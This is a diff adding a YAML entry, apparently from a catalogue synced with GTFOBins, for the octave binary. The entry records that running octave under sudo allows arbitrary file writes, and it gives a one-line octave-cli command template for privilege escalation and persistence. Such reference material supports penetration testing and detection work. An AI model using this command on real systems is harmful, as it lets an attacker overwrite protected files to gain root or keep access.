@@ -1,0 +1,24 @@
+id: gtfobins/octave/file-write/sudo
+type: binary
+platform: linux
+name: octave
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+references:
+- https://gtfobins.github.io/gtfobins/octave/
+tags:
+- linux
+- unix
+- gtfobins
